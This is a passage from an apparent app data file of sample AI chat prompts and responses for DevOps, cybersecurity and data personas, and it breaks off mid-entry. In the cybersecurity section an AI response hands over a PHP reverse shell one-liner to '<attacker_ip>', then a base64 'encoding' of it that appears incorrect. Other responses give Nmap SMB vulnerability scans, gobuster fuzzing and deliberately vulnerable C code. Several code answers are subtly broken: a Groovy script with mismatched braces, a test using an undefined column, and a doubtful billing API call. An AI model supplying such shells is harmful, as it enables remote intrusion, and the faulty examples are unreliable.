            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'Provide me best practices for using terraform',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nSure, here are some best practices to keep in mind when using Terraform:\n\n1. Use a consistent folder structure: A consistent folder structure will help you organize your Terraform codebase better. You can have separate folders for modules, variables, and providers.\n\n2. Keep your variables organized: Keeping your variables organized ensures that you can make changes without affecting the rest of the infrastructure code. Group variables in a separate file or folder, so they are independent and easy to manage.\n\n3. Use module re-usability: Modules are a central concept in Terraform, and using them allows you to manage code re-usability. You can break larger infrastructure code into smaller modules that can be reused across multiple projects.\n\n4. Use version control: Version control is crucial when using Terraform. It enables tracking changes, rollback, collaboration and prevents any unintentional changes. Use Git, GitHub or GitLab for better collaboration and versioning of your code.\n\n5. Use a CI/CD tool: A CI/CD tool like Jenkins or GitLab CI can help automate your Terraform workflow. Specifically, run terraform plan and terraform apply securely. Incorporating a CI/CD pipeline helps reduce errors and increase efficiency.\n\n6. Check and validate code before applying changes: Running terraform validate, terraform fmt, and terraform lint ensures that your code is error-free, styled correctly and adheres to best practices. \n\n7. Use environment-specific state files: Terrform requires state management to track changes to infrastructure. For better inventory management of environments, use separate state files for dev, staging, and production environments.\n\n8. Regularly audit your Terraform resources: Auditing Terraform resources give you an overview of the changes made so far. Basic audit logs should include who, when, and what changes have been made to the infrastructure.\n\nThese best practices are not exhaustive, but they provide a starting point for streamlining your Terraform codebase, making it simpler and more reliable.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'Provide me best practices for deploy app in Amazon Web Services',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nSure, here are some best practices for deploying an application on Amazon Web Services:\n\n1. Use AWS Elastic Beanstalk or AWS CodeDeploy: These services automate deployment, scaling, and monitoring of your application.\n\n2. Use AWS CloudFormation: It helps you to create a stack of resources that can be quickly and easily launched in multiple environments.\n\n3. Use AWS Auto Scaling: It helps to automatically adjust capacity based on demand, ensuring your application can handle spikes in traffic.\n\n4. Use Amazon CloudWatch: It lets you to monitor your AWS resources and applications in real-time, so you can detect issues and fix them before they cause a problem.\n\n5. Use Amazon S3: It\'s a highly durable and secure object storage service, perfect for storing static content like images, audio, and video.\n\n6. Use Amazon RDS: It provides managed relational databases that are secure, scalable, and easy to manage.\n\n7. Use Elastic Load Balancing: It distributes incoming traffic across multiple instances, ensuring high availability and scaling.\n\n8. Use AWS Identity and Access Management (IAM): It lets you to create and manage user permissions, ensuring that only authorized users have access to your resources.\n\n9. Use AWS Security Groups: It lets you to manage access to your instances, controlling traffic in and out of your instances.\n\n10. Use AWS CloudTrail: It helps you to track all activity in your AWS account, providing an audit trail for compliance purposes.\n\nBy following these best practices, you can ensure that your application is highly available, easy to scale, and secure in AWS.',
            },
          },
        ],
      },
      {
        shortTitle: 'GC',
        title: 'Gitlab CI',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'generate a sample gitlab ci pipeline',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s a sample GitLab CI pipeline for a simple Node.js project:\n\n```yml\nstages:\n  - build\n  - test\n  - deploy\n\nbuild:\n  stage: build\n  image: node:latest\n  script:\n    - npm install\n    - npm run build\n  artifacts:\n    paths:\n      - build/\n\ntest:\n  stage: test\n  image: node:latest\n  script:\n    - npm install\n    - npm test\n\ndeploy:\n  stage: deploy\n  image: docker:latest\n  dependencies:\n    - build\n  script:\n    - docker build -t myapp .\n    - docker tag myapp:latest myapp:prod\n    - docker push myapp:prod\n  environment:\n    name: production\n    url: https://myapp.com\n  only:\n    - master\n```\n\nThis pipeline has three stages: build, test, and deploy. In the build stage, it installs the dependencies and builds the project, then saves the built artifacts as artifacts for later use. In the test stage, it installs the dependencies and runs the tests. Finally, in the deploy stage, it uses the previously built artifacts to build a Docker container, tags it as `myapp:prod`, and pushes it to a Docker registry. This stage runs only on the master branch and deploys to a production environment.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as an Devops. Only write code no explanation',
                role: 'system',
              },
              {
                content: 'generate a sample gitlab ci pipeline',
                role: 'user',
              },
            ],
            response: {
              content:
                '```\n# Define stages to be executed\nstages:\n  - build\n  - test\n  - deploy\n\n# Declare job for building the application code\nbuild-app:\n  stage: build\n  script:\n    - npm install\n    - npm run build\n\n# Declare job for running unit and integration tests\ntest-app:\n  stage: test\n  script:\n    - npm run test\n\n# Declare job for deploying the application to the staging environment\ndeploy-to-staging:\n  stage: deploy\n  script:\n    - ssh user@staging-server \'cd /var/www/app && git pull origin master && npm install && pm2 restart all\'\n\n# Declare job for deploying the application to the production environment\ndeploy-to-production:\n  stage: deploy\n  script:\n    - ssh user@production-server \'cd /var/www/app && git pull origin master && npm install && pm2 restart all\'\n  only:\n    - master\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'Sc',
        title: 'Script',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'Write an example python script to generate the bill for google cloud',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here is an example Python script to generate the bill for Google Cloud using the Google Cloud API:\n\n```python\nimport google.auth\nfrom google.cloud import billing_v1\n\n# Set authentication credentials.\ncredentials, project_id = google.auth.default()\n\n# Create a client for the billing API.\nclient = billing_v1.CloudBillingClient(credentials=credentials)\n\n# Set the billing account ID.\nbilling_account_id = \'billingAccounts/ABC123-456DEF-789GHI\'\n\n# Set the time range for the bill you want to generate.\nstart_time = \'2021-08-01T00:00:00Z\'\nend_time = \'2021-08-31T23:59:59Z\'\n\n# Set the currency code you want to display the bill in.\ncurrency_code = \'USD\'\n\n# Generate the bill.\nbill = client.generate_monthly_bill(billing_account_id, start_time, end_time, currency_code=currency_code)\n\n# Print the total amount due on the bill.\nprint(f"Total amount due: {bill.total_amount}")\n```\n\nThis script generates the monthly bill for the month of August 2021 for a Google Cloud billing account with ID `billingAccounts/ABC123-456DEF-789GHI`, in the currency of USD. You can modify the start and end times and the billing account ID to generate bills for different time ranges and billing accounts.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'Write an example python script to generate the bill for AWS',
                role: 'user',
              },
            ],
            response: {
              content:
                'Here\'s an example Python script that calculates the bill for AWS based on usage:\n\n```\n# Import the necessary libraries\nimport boto3\n\n# Define your AWS credentials\naws_access_key_id = \'YOUR_AWS_ACCESS_KEY_ID\'\naws_secret_access_key = \'YOUR_AWS_SECRET_ACCESS_KEY\'\n\n# Initialize the boto3 client with the appropriate service and region\nclient = boto3.client(\'ce\', region_name=\'us-east-1\', aws_access_key_id=aws_access_key_id, aws_secret_access_key=aws_secret_access_key)\n\n# Define the time period for which you want to get the bill\nstart_date = \'2021-01-01\'\nend_date = \'2021-01-31\'\n\n# Get the bill for the specified time period\nresponse = client.get_cost_and_usage(TimePeriod={\'Start\': start_date, \'End\': end_date})\n\n# Get the total cost and usage for the specified time period\ntotal_cost = response[\'ResultsByTime\'][0][\'Total\'][\'UnblendedCost\'][\'Amount\']\ntotal_usage = response[\'ResultsByTime\'][0][\'Total\'][\'UsageAmount\'][\'Amount\']\n\n# Print the total cost and usage\nprint(\'Total Cost: $\' + str(total_cost))\nprint(\'Total Usage: \' + str(total_usage) + \' hours\')\n```\n\nThis script uses the AWS Cost Explorer API to get the bill for the specified time period and calculates the total cost and usage. You\'ll need to replace the placeholders for your AWS credentials and specify the time period of interest.',
            },
          },
        ],
      },
      {
        shortTitle: 'Gr',
        title: 'Groovy',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'write a Groovy script to deploy over dev and prod branch in jenkins',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s an example Groovy script that deploys code to both dev and prod branches in Jenkins:\n\n```\n// Set up authentication credentials\ndef credsId = \'my-credentials-id\'\ndef jenkins = Jenkins.getInstance()\ndef mycreds = jenkins.getDescriptor(\'hudson.plugins.git.UserRemoteConfig\').getCredentials(credsId)\n\n// Checkout dev branch\nnode {\n    stage(\'checkout dev\') {\n        git credentialsId: credsId,\n            url: \'https://github.com/myrepo.git\',\n            branch: \'dev\'\n        }\n    }\n    // Build and deploy to dev\n    stage(\'build and deploy to dev\') {\n        sh \'mvn clean package\'\n        sh \'deploy-to-dev.sh\'\n    }\n}\n\n// Checkout prod branch\nnode {\n    stage(\'checkout prod\') {\n        git credentialsId: credsId,\n            url: \'https://github.com/myrepo.git\',\n            branch: \'prod\'\n        }\n    }\n    // Build and deploy to prod\n    stage(\'build and deploy to prod\') {\n        sh \'mvn clean package\'\n        sh \'deploy-to-prod.sh\'\n    }\n}\n```\n\nAssuming you have set up the appropriate credentials and shell scripts, this script should checkout the dev and prod branches from your GitHub repository, build and deploy the code to each branch.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as an Devops',
                role: 'system',
              },
              {
                content: 'write a Groovy script to deploy over dev and prod branch in jenkins',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here\'s an example Groovy script that deploys code to both dev and prod branches in Jenkins:\n\n```\n// Set up authentication credentials\ndef credsId = \'my-credentials-id\'\ndef jenkins = Jenkins.getInstance()\ndef mycreds = jenkins.getDescriptor(\'hudson.plugins.git.UserRemoteConfig\').getCredentials(credsId)\n\n// Checkout dev branch\nnode {\n    stage(\'checkout dev\') {\n        git credentialsId: credsId,\n            url: \'https://github.com/myrepo.git\',\n            branch: \'dev\'\n        }\n    }\n    // Build and deploy to dev\n    stage(\'build and deploy to dev\') {\n        sh \'mvn clean package\'\n        sh \'deploy-to-dev.sh\'\n    }\n}\n\n// Checkout prod branch\nnode {\n    stage(\'checkout prod\') {\n        git credentialsId: credsId,\n            url: \'https://github.com/myrepo.git\',\n            branch: \'prod\'\n        }\n    }\n    // Build and deploy to prod\n    stage(\'build and deploy to prod\') {\n        sh \'mvn clean package\'\n        sh \'deploy-to-prod.sh\'\n    }\n}\n```\n\nAssuming you have set up the appropriate credentials and shell scripts, this script should checkout the dev and prod branches from your GitHub repository, build and deploy the code to each branch.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-cybersecurity--',
    mode: [
      {
        shortTitle: 'CP',
        title: 'Cybersecurity Plan',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'I need help developing an effective cybersecurity strategy for mobile app.',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nCertainly, as a cybersecurity specialist, I can help you develop an effective cybersecurity strategy for mobile app. Here are some steps you can take:\n\n1. Identify and prioritize your mobile app\'s potential vulnerabilities: Consider the various risks your app might face, such as data breaches, malicious attacks or unauthorized access. Create a list of potential threats and rank them from high to low risk.\n\n2. Implement strong authentication and password policies: Use industry-standard encryption algorithms to ensure the safety and privacy of users\' data. Additionally, enforce strong password policies that require a combination of uppercase and lowercase letters, numbers, and symbols.\n\n3. Apply network security measures: Ensure secure data transmission between the mobile app and web server through Transport Layer Security (TLS) which is a protocol to encrypt data during transmission to secure against intrusion.\n\n4. Regularly update your mobile app: Keep your mobile app up-to-date with the latest security patches and software updates, as outdated software can have security vulnerabilities that hackers can exploit.\n\n5. Conduct regular security testing: Perform regular security testing to prevent data and security breaches, and to ensure that the security controls and protocols established in the app are performing as expected.\n\n6. Monitor user activity: Monitor user activity within the mobile app to detect unusual, concerning or malicious activities that may indicate security risks or breaches.\n\n7. Continuously educate users: Educate mobile app users on best practices in cybersecurity, and continuously remind them of the potential risks of using the app and how to protect their personal data.\n\nBy implementing these strategies, you can ensure that your mobile app is secure and reliable, protecting your users from potential risks and providing a highly secure and enhanced user experience.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'I need help developing an effective cybersecurity strategy for eccomerce.',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here are some steps you can follow to develop an effective cybersecurity strategy for an e-commerce business:\n\n1. Risk Assessment - Identify the potential risks and threats to your e-commerce platform. This could include data breaches, DDoS attacks, malware, phishing attacks, and more. Assess the likelihood and potential impact of each of these risks.\n\n2. Strong Password Management - Use strong passwords and implement password policies that include frequent password updates and two-factor authentication (2FA). Encourage employees and customers to use strong passwords and avoid sharing them.\n\n3. Secure Data Storage - Ensure that all sensitive customer data, such as credit card numbers and personal information, is encrypted and stored securely. Use SSL encryption to protect all data in transit to and from your website.\n\n4. Regular System Updates/Security Patches - Install security updates and patches regularly to reduce the risk of vulnerabilities being exploited. Use a firewall to strengthen your network security, and install anti-virus and anti-malware software.\n\n5. Disaster Recovery Plan - Develop a disaster recovery plan to ensure that in the event of a cybersecurity incident, you can restore normal operations as soon as possible. This plan should include backups, offsite storage of data, and regular testing to ensure it works.\n\n6. Employee Training - Train all employees on proper cybersecurity practices, such as phishing awareness and data handling policies. Create a culture of cybersecurity within your organization.\n\n7. Regular Audits - Regularly audit your cybersecurity measures to ensure they are still effective and current. Conduct regular penetration testing to identify potential weaknesses, and work to mitigate any issues discovered.\n\nBy following these steps, you can create a robust and effective cybersecurity strategy for your e-commerce business, which will help protect sensitive data and maintain customer trust.',
            },
          },
        ],
      },

      {
        shortTitle: 'Vu',
        title: 'Vulnerabilities',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'How can I scan for SMB vulnerabilities with Nmap',
                role: 'user',
              },
            ],
            response: {
              content:
                'You can use Nmap to scan for SMB (Server Message Block) vulnerabilities by using the following command:\n\n```\nnmap -p 139,445 --script smb-vuln* <target_ip>\n```\n\nThis command will scan for open SMB ports (139 and 445) on the specified `<target_ip>` address and run all the SMB vulnerability scripts that start with "smb-vuln" in Nmap\'s default script library.\n\nYou can also use specific SMB vulnerability scripts with the `--script` option. For example, to check for the MS17-010 vulnerability in SMB, you can use the following command:\n\n```\nnmap -p 139,445 --script smb-vuln-ms17-010 <target_ip>\n```\n\nThis command will only run the smb-vuln-ms17-010 script, which checks for the vulnerability that was exploited by the WannaCry ransomware attacks.\n\nKeep in mind that Nmap scanning can potentially cause network disruption, so it\'s important to perform network scans responsibly and with the appropriate permissions.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'How can I scan for SMB vulnerabilities with Nmap',
                role: 'user',
              },
            ],
            response: {
              content:
                'You can use Nmap to scan for SMB (Server Message Block) vulnerabilities by using the following command:\n\n```\nnmap -p 139,445 --script smb-vuln* <target_ip>\n```\n\nThis command will scan for open SMB ports (139 and 445) on the specified `<target_ip>` address and run all the SMB vulnerability scripts that start with "smb-vuln" in Nmap\'s default script library.\n\nYou can also use specific SMB vulnerability scripts with the `--script` option. For example, to check for the MS17-010 vulnerability in SMB, you can use the following command:\n\n```\nnmap -p 139,445 --script smb-vuln-ms17-010 <target_ip>\n```\n\nThis command will only run the smb-vuln-ms17-010 script, which checks for the vulnerability that was exploited by the WannaCry ransomware attacks.\n\nKeep in mind that Nmap scanning can potentially cause network disruption, so it\'s important to perform network scans responsibly and with the appropriate permissions.',
            },
          },
        ],
      },
      {
        shortTitle: 'RS',
        title: 'Reverse Shell',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'Generate a php reverse shell one liner',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, here is a one-liner that generates a PHP reverse shell:\n\n```\nphp -r \'$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");\'\n```\n\nNote: Replace `<attacker_ip>` with the IP address of your attacking machine and `<attacker_port>` with the port number you want to use for the shell. After running this one-liner on the target machine, you will get a reverse shell on your attacking machine. \n\nBe aware that using shells on other machines without their consent is ILLEGAL and you could face serious legal consequences. This information is for educational purposes only, and should not be used to engage in any illegal activities.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content:
                  'encode base 64 the next code (php -r \'$sock=fsockopen("<attacker_ip>",<attacker_port>);exec("/bin/sh -i <&3 >&3 2>&3");\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'cGhwIC1yICdzb2NrPWZzb2NrZG9uZyg8YXR0YWNrZXJfaXA+XCJ7YXR0YWNrZXJfaXB9XCIsPHR5cGU+YXR0YWNrZXJfcG9ydD4pO2V4ZWMgL2Jpbi9zaCAtaSA8JjMgPj4mMzs= \n\n(Note: Please note that we do not encourage or condone the use of this code for any malicious purposes. This response is purely for educational and information purposes.)',
            },
          },
        ],
      },
      {
        shortTitle: 'BF',
        title: 'Brute Forcing',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'How can I fuzz for .xml files with gobuster',
                role: 'user',
              },
            ],
            response: {
              content:
                'You can use gobuster to fuzz for .xml files by using the following command:\n\n```sh\ngobuster dir -u <URL> -w <WORDLIST> -x xml\n```\n\nWhere `<URL>` is the target URL you want to scan and `<WORDLIST>` is the path to the wordlist you want to use for the fuzzing.\n\nThe `-x xml` option tells gobuster to only search for files with the .xml extension. This will ensure that only .xml files will be listed in the output of the scan.\n\nAlternatively, you can add the `-t` option to specify the number of threads to use in the scan. For example:\n\n```sh\ngobuster dir -u <URL> -w <WORDLIST> -x xml -t 10\n```\n\nThis will use 10 threads to speed up the scan. However, be aware that using too many threads can cause the server to become overloaded and impact its performance.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'How can I fuzz for .php files with gobuster that return a 200 status code',
                role: 'user',
              },
            ],
            response: {
              content:
                'You can fuzz for .php files with gobuster using the following command:\n\n```\ngobuster -u <target_url> -w <wordlist> -e -s "200" -x php\n```\n\nHere\'s a breakdown of what each of the options mean:\n\n- `-u` specifies the target URL.\n- `-w` specifies the wordlist you want to use for the fuzzing.\n- `-e` URL encodes the input, which is useful for certain applications.\n- `-s "200"` specifies the status code you want to look for. In this case, we are looking for status code 200, which usually indicates a successful response.\n- `-x php` specifies that you only want to look for .php files.\n\nWhen you run this command, it will fuzz the target URL with words from the wordlist and only report back if a .php file is found that returns a 200 status code. This can be useful for identifying potential vulnerabilities or files that you may have missed during manual reconnaissance.',
            },
          },
        ],
      },
      {
        shortTitle: 'Vu',
        title: 'Vulnerability',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'C code vulnerable to buffer overflows',
                role: 'user',
              },
            ],
            response: {
              content:
                'Here\'s an example of C code that is vulnerable to buffer overflow:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid function(char *str) {\n    char buffer[16];\n    strcpy(buffer, str); // Vulnerable line\n    printf("Buffer: %s\\n", buffer);\n}\n\nint main() {\n    char *str = "This is a very long string that can cause a buffer overflow";\n    function(str);\n    return 0;\n}\n```\n\nIn this code, the `function()` takes a string argument and copies it into a buffer using `strcpy()`, which does not check the length of the input string. If the input string is longer than the size of the buffer (16 bytes), the extra data can overflow the buffer and overwrite other data on the stack.\n\nAn attacker could exploit this vulnerability by providing an input string that includes machine code instructions to execute, or by overwriting variables and function pointers on the stack to modify the behavior of the program.\n\nTo prevent buffer overflow vulnerabilities, it is important to always check the length of input data and use secure string-handling functions like `strncpy()` that limit the amount of data that can be copied to a buffer. Additionally, using compiler flags like `-fstack-protector` can help detect stack-based buffer overflow vulnerabilities by including canary values in the stack that are checked for integrity before the function returns.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'C code vulnerable to buffer overflows',
                role: 'user',
              },
            ],
            response: {
              content:
                'Here\'s an example of C code that is vulnerable to buffer overflow:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid function(char *str) {\n    char buffer[16];\n    strcpy(buffer, str); // Vulnerable line\n    printf("Buffer: %s\\n", buffer);\n}\n\nint main() {\n    char *str = "This is a very long string that can cause a buffer overflow";\n    function(str);\n    return 0;\n}\n```\n\nIn this code, the `function()` takes a string argument and copies it into a buffer using `strcpy()`, which does not check the length of the input string. If the input string is longer than the size of the buffer (16 bytes), the extra data can overflow the buffer and overwrite other data on the stack.\n\nAn attacker could exploit this vulnerability by providing an input string that includes machine code instructions to execute, or by overwriting variables and function pointers on the stack to modify the behavior of the program.\n\nTo prevent buffer overflow vulnerabilities, it is important to always check the length of input data and use secure string-handling functions like `strncpy()` that limit the amount of data that can be copied to a buffer. Additionally, using compiler flags like `-fstack-protector` can help detect stack-based buffer overflow vulnerabilities by including canary values in the stack that are checked for integrity before the function returns.',
            },
          },
        ],
      },
      {
        shortTitle: 'RC',
        title: 'Registry changes',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'ELK query to detect registry changes',
                role: 'user',
              },
            ],
            response: {
              content:
                'Here\'s an example ELK query that can be used to detect registry changes:\n\n```\nPOST /logstash*/_search\n{\n  "query": {\n    "bool": {\n      "must": [\n        {\n          "term": {\n            "event_data.TargetObject": "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"\n          }\n        },\n        {\n          "range": {\n            "@timestamp": {\n              "gte": "now-1d",\n              "lte": "now"\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\nThis query searches for all log events related to registry changes made to the "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" key within the last day (adjustable using the "gte" and "lte" parameters).\n\nThis query uses the following components:\n- `"event_data.TargetObject"` searches specifically for changes made to the specified registry key.\n- `"range"` query searches for all events that occur within a given time range (in this case, within the last day).\n- `"bool"` query uses two separate conditions (must criteria) that must both be satisfied for the query to return any matches.\n\nNote that this query assumes that the Windows event logs generated by the system are being ingested into ELK indices. If the logs are not being ingested, then additional configuration and/or filtering will be required to route them to the proper index.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'Regular expression to filter IP Address in SPlunk',
                role: 'user',
              },
            ],
            response: {
              content:
                'In order to filter IP addresses in Splunk using regular expressions, you can use the following regex pattern:\n\n```\n\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\n```\n\nThis pattern matches any sequence of four numbers separated by periods, where each number can be between 0 and 255. This will match any IPv4 address.\n\nYou can use this pattern in Splunk search queries to filter events that contain IP addresses. For example, the following query will return events that contain an IP address in the source or destination fields:\n\n```\nsource="myfile.log" OR destination="*.com" | rex field=_raw "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b"\n```\n\nThis will return events where an IP address is present in the source or destination fields. You can modify the field names and the regular expression to match your specific use case.',
            },
          },
        ],
      },
      {
        shortTitle: 'Au',
        title: 'Automation',
        examples: [
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content: 'generate a bash script that automates ports scanning with Nmap',
                role: 'user',
              },
            ],
            response: {
              content:
                'Sure, I can help you with that! Here\'s a simple bash script that you can use to automate port scanning using Nmap:\n\n```bash\n#!/bin/bash\n\necho "Enter the IP address or hostname to scan: "\nread target\n\necho "Enter the name of the output file: "\nread outfile\n\necho "Scanning $target for open ports..."\necho "Results will be written to $outfile"\n\n#Run nmap command and save output to specified file\nnmap -v -oG $outfile -p 1-65535 $target\n\necho "Scan complete!"\n```\n\nTo use this script, simply save it to a file on your computer (e.g. scan.sh), make it executable with the command `chmod +x scan.sh`, and then run it with the command `./scan.sh`. The script will prompt you for the IP address or hostname you want to scan, as well as the name of the output file to save the results to. It will then run the Nmap command to scan all possible ports on the target and save the output to the specified file.',
            },
          },
          {
            request: [
              {
                content: 'I want you to act as a cyber security specialist.',
                role: 'system',
              },
              {
                content:
                  'I need a bast script that automates subdomain enumeration with Sublist3r and takes screenshots with Eyewitness',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nSure, here is the script using Python:\n\n```\n#!/bin/bash\n\n# Install Sublist3r and Eyewitness\nsudo apt-get install sublist3r eyewitness\n\n# Get the target domain from the user\nread -p \'Enter the target domain: \' domain\n\n# Run Sublist3r to get the subdomains\necho \'Enumerating subdomains with Sublist3r...\'\nsublist3r -d $domain -o subdomains.txt\n\n# Take screenshots with Eyewitness\necho \'Taking screenshots with Eyewitness...\'\neyewitness --web -f subdomains.txt --no-prompt\n```\n\nTo use the script, save the code above in a file with a `.sh` extension (e.g., `subdomain_enum.sh`). Then, in a terminal window, navigate to the directory where you saved the script and run the following command:\n\n```\nchmod u+x subdomain_enum.sh\n```\n\nThis will make the script executable. Finally, run the script using:\n\n```\n./subdomain_enum.sh\n```\n\nThe script will prompt you to enter the target domain. After providing the domain, it will use Sublist3r to enumerate subdomains and save the results to a file called `subdomains.txt`. Then, it will call Eyewitness to take screenshots of each subdomain and save them to a folder called `eyewitness` in the current directory',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-data-ai--',
    mode: [
      {
        shortTitle: 'UT',
        title: 'Unit Test',
        examples: [
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  '```\ndef mark_outliers(dataframe):\n    Q1 = dataframe.quantile(0.25)\n    Q3 = dataframe.quantile(0.75)\n    IQR = Q3 - Q1\n    outliers = (dataframe < (Q1 - 1.5 * IQR)) | (dataframe > (Q3 + 1.5 * IQR))\n    return outliers\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\nimport pandas as pd\nimport numpy as np\nimport unittest\n\nclass TestMarkOutliers(unittest.TestCase):\n    \n    def test_mark_outliers(self):\n        dataframe = pd.DataFrame({\'A\': [1, 2, 3, 4, 5, 6, 7, 8, 9, 10],\n                                  \'B\': [10, 20, 30, 11, 12, 13, 40, 15, 16, 17],\n                                  \'C\': [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000]})\n        expected_output = pd.DataFrame({\'A\': [False, False, False, False, False, False, False, False, False, False],\n                                         \'B\': [False, False, False, False, False, False, True, False, False, False],\n                                         \'C\': [False, False, False, True, True, True, True, True, True, True]})\n        np.testing.assert_array_equal(mark_outliers(dataframe), expected_output)\n\nif __name__ == \'__main__\':\n    unittest.main(argv=[\'first-arg-is-ignored\'], exit=False)\n```',
            },
          },
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  '```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\n# Load data\ndata = pd.read_csv(\'data.csv\')\n\n# Create revenue categories\ndata[\'rev_categories\'] = pd.qcut(data[\'revenue\'], q=4, labels=False)\n\n# Split data into sample A and B, stratified on revenue\nA, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\ndef test_data_splitting():\n    data = pd.DataFrame({\n        "revenue": [1,2,3,4,5,6,7,8,9,10], \n        "col1": [1,2,3,4,5,6,7,8,9,10],\n        "col2": [1,2,3,4,5,6,7,8,9,10]\n    })\n    expected_A = pd.DataFrame({\n        "revenue": [1,2,3,4,5], \n        "col1": [1,2,3,4,5],\n        "col2": [1,2,3,4,5]\n    })\n    expected_B = pd.DataFrame({\n        "revenue": [6,7,8,9,10], \n        "col1": [6,7,8,9,10],\n        "col2": [6,7,8,9,10]\n    })\n    A, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n    pd.testing.assert_frame_equal(expected_A.reset_index(drop=True), A.reset_index(drop=True))\n    pd.testing.assert_frame_equal(expected_B.reset_index(drop=True), B.reset_index(drop=True))\n```',
            },
          },
        ],
      },

      {
        shortTitle: 'CD',
        title: 'Create Code',
        examples: [
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  'Create a python function that can mark colums from a pandas dataframe as ourliers using the IQR method',
                role: 'user',
              },
            ],
            response: {
              content:
                '```\ndef mark_outliers(dataframe):\n    Q1 = dataframe.quantile(0.25)\n    Q3 = dataframe.quantile(0.75)\n    IQR = Q3 - Q1\n    outliers = (dataframe < (Q1 - 1.5 * IQR)) | (dataframe > (Q3 + 1.5 * IQR))\n    return outliers\n```',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write python code to create sample A and B groups, stratified on revenue',
                role: 'user',
              },
            ],
            response: {
              content:
                '```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\n# Load data\ndata = pd.read_csv(\'data.csv\')\n\n# Create revenue categories\ndata[\'rev_categories\'] = pd.qcut(data[\'revenue\'], q=4, labels=False)\n\n# Split data into sample A and B, stratified on revenue\nA, B = train_test_split(data, test_size=0.5, stratify=data[\'rev_categories\'], random_state=42)\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'EC',
        title: 'Explain Code',
        examples: [
          {
            request: [
              {
                content: 'Explain me the next code as a data developer',
                role: 'system',
              },
              {
                content:
                  '```\ndef mark_outliers(dataframe):\n    Q1 = dataframe.quantile(0.25)\n    Q3 = dataframe.quantile(0.75)\n    IQR = Q3 - Q1\n    outliers = (dataframe < (Q1 - 1.5 * IQR)) | (dataframe > (Q3 + 1.5 * IQR))\n    return outliers\n```',
                role: 'user',
              },
            ],
            response: {
              content:
